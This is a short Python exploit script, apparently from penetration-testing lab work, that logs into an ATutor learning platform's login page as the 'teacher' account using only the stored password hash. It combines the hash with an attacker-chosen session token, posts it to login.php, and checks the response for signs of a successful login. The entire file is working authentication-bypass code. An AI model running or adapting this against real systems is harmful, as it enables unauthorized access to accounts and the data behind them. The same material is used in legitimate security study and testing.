import sys
import hashlib
import requests

def gen_hash(passwd, token):
    #Complete

    #hex_sha1(hex_sha1(document.form.form_password.value) + "<?php echo $_SESSION['token']; ?>");
    #password from db is alread hashed so it's really hex_sha1(password_db + $_SESSION['token'])
    m = hashlib.sha1()
    m.update((passwd + token).encode('utf-8'))
    return m.hexdigest()

def we_can_login_with_a_hash():
    target = "http://{}/ATutor/login.php".format(sys.argv[1])
    token = "hax"
    hashed = gen_hash(sys.argv[2], token)
    print("hashed: {}".format(hashed))

    payload = {
            "form_password_hidden": hashed,
            "form_login": "teacher",
            "submit": "Login",
            "token": token
            }

    s = requests.Session()
    r = s.post(target, data=payload)
    res = r.text
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        return True
    return False


def main():
    if len(sys.argv) != 3:
        print("(+) usage: {} <target> <hash>".format(sys.argv[0])) 
        print("(+) eg: {} 192.168.137.103 5b11a067b....".format(sys.argv[0])) 
        sys.exit(-1)

    if we_can_login_with_a_hash():
        print("(+) sucess!")
    else:
        print("(-) failure!") 

if __name__ == "__main__":
    main()
